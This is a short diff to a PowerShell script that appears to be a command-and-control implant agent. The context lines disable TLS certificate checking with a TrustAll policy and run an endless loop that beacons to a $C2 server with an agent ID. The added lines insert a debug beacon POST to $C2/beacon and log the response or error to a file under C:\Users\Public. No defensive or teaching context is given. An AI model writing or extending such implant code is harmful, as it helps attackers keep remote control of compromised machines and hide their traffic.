@@ -19,6 +19,18 @@ public class TrustAll : ICertificatePolicy {
 "@
 [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAll
 
+# Test beacon with error logging
+try {
+    $body = @{ id = $AgentId; result = $null } | ConvertTo-Json
+    $resp = Invoke-RestMethod -Uri "$C2/beacon" -Method POST `
+                -Headers $Headers -Body $body
+    "SUCCESS: Got response" | Out-File "C:\Users\Public\beacon_log.txt" -Force
+    $resp | ConvertTo-Json | Out-File "C:\Users\Public\beacon_log.txt" -Append
+} catch {
+    "ERROR: $($_.Exception.Message)" | Out-File "C:\Users\Public\beacon_log.txt" -Force
+    $_.Exception | Format-List * | Out-File "C:\Users\Public\beacon_log.txt" -Append
+}
+
 while ($true) {
     try {
         $body = @{ id = $AgentId; result = $null } | ConvertTo-Json
